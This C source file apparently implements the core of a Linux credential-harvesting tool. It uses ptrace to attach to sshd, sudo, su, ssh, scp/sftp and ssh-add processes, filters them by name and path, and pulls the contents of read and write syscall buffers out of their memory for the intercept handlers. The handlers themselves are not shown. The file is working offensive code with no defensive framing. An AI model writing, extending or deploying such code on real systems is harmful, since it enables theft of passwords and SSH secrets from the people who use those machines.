#include <sys/ptrace.h>
#include <bits/types.h>
#include <sys/reg.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <assert.h>
#include <string.h>
#include <ctype.h>

#define FILE_TRACERS 1
#include "config.h"
#include "helpers.h"
#include "procinfo.h"
#include "tracers.h"

void (*tracers[])(pid_t) = {NULL, intercept_ssh, intercept_sudo, intercept_su, intercept_ssh_client, NULL};

pid_t process_pid;
char *process_name;
char *process_path;
char *process_username;


long __get_reg(pid_t child, int off) {
  long val = ptrace(PTRACE_PEEKUSER, child, off);
  assert(errno == 0);
  return val;
}

int wait_for_syscall(pid_t child) {
  int status = -1;
  while (1) {
    ptrace(PTRACE_SYSCALL, child, NULL, NULL);
    waitpid(child, &status, 0);

    if (WIFSTOPPED(status) && WSTOPSIG(status) & 0x80) {
      return 0;
    }

    if (WIFSTOPPED(status)) {
      kill(child, WSTOPSIG(status));
      return 1;
    }

    if (WIFEXITED(status)) {
      return 1;
    }
  }
}

char *read_memory(pid_t child, unsigned long addr, long len) {
  char *val = NULL;
  long read = 0;
  unsigned long tmp = 0;

  if (len + sizeof(unsigned long) + 1 < len)
    return NULL;

  val = (char *) calloc(len + sizeof(unsigned long) + 1, 1);

  if (!val)
    return NULL;


  while (read < len) {
    tmp = ptrace(PTRACE_PEEKDATA, child, addr + read);
    if (errno != 0) {
      val[read] = 0;
      break;
    }

    memcpy(val + read, &tmp, sizeof(tmp));
    read += sizeof(tmp);
  }

  return val;
}

char *extract_read_string(pid_t traced_process, long length) {
  char *strval = NULL;
  long str_ptr = 0;

  str_ptr = get_syscall_arg(traced_process, 1);
  strval = read_memory(traced_process, str_ptr, length);

  return strval;
}

char *extract_write_string(pid_t traced_process, long length) {
  char *strval = NULL;
  long str_ptr = 0;

  str_ptr = get_syscall_arg(traced_process, 1);
  strval = read_memory(traced_process, str_ptr, length);

  return strval;
}

long get_syscall_arg(pid_t child, int which) {
  switch (which) {
#ifdef __amd64__
  case 0: return get_reg(child, rdi);
  case 1: return get_reg(child, rsi);
  case 2: return get_reg(child, rdx);
  case 3: return get_reg(child, r10);
  case 4: return get_reg(child, r8);
  case 5: return get_reg(child, r9);
#else
  case 0: return get_reg(child, ebx);
  case 1: return get_reg(child, ecx);
  case 2: return get_reg(child, edx);
  case 3: return get_reg(child, esi);
  case 4: return get_reg(child, edi);
  case 5: return get_reg(child, ebp);
#endif
  default: return -1;
  }
}

//Wrapper free functions to null out global variables when freed
void free_process_name(void) {
  free(process_name);
  process_name = NULL;
}

void free_process_path(void) {
  free(process_path);
  process_path = NULL;
}

void free_process_username(void) {
  free(process_username);
  process_username = NULL;
}

enum tracer_types validate_process_name(void) {


  if (!process_name)
    return invalid_tracer;

  if (ENABLE_SSH && strncmp(process_name, P_SSH_NET, strlen(P_SSH_NET)) == 0)
    return ssh_tracer;

  if (ENABLE_SSH && strncmp(process_name, P_SSH_ACC, strlen(P_SSH_ACC)) == 0)
    return ssh_tracer;

  if (ENABLE_SUDO && strncmp(process_name, P_SUDO, strlen(P_SUDO)) == 0)
    return sudo_tracer;

  if (ENABLE_SU && strncmp(process_name, P_SU, strlen(P_SU)) == 0)
    return su_tracer;

  if (ENABLE_SSH_CLIENT && (strncmp(process_name, P_SSH_CLIENT, strlen(P_SSH_CLIENT)) == 0 || 
                            strncmp(process_name, P_SSH_SCP_SFTP, strlen(P_SSH_SCP_SFTP)) == 0 ||
                            strncmp(process_name, P_SSH_ADD, strlen(P_SSH_ADD)) == 0))
    return ssh_client_tracer;

  return invalid_tracer;
}

int validate_process_path(void) {
  const char *config_path = NULL;
  size_t slen = 0;
  int i = 0;

  if (!process_path)
    return 0;

  for (i = 0; i < CONFIG_PROCESS_PATHS; i++) {
    config_path = config_valid_process_paths[i];
    slen = strlen(config_path);

    if (strncmp(process_path, config_path, slen) == 0)
      return 1;
  }

  return 0;
}

void refresh_process_name(pid_t traced_process) {
  if (process_name)
    free_process_name();

  process_name = get_proc_name(traced_process);
}

int get_syscall(pid_t traced_process) {
  int num = 0;

  num = get_reg(traced_process, orig_eax);
  assert(errno == 0);

  return num;
}

int strnascii(const char *string, size_t length) {
  size_t i = 0;

  for (i = 0; i < length; i++) {
    if (!isascii(string[i]))
      return 0;
  }

  return 1;
}

void trace_process(pid_t traced_process) {
  enum tracer_types type = invalid_tracer;

  process_name = get_proc_name(traced_process);
  process_path = get_proc_path(traced_process);
  process_pid = traced_process;

  if (!process_name || !process_path)
    return;

  type = validate_process_name();

  if (!process_name || !type || !process_path)
    return;

  if (!validate_process_path())
    return;

  process_username = get_proc_username(traced_process);

  if (tracers[type] != NULL)
    tracers[type](traced_process);
}

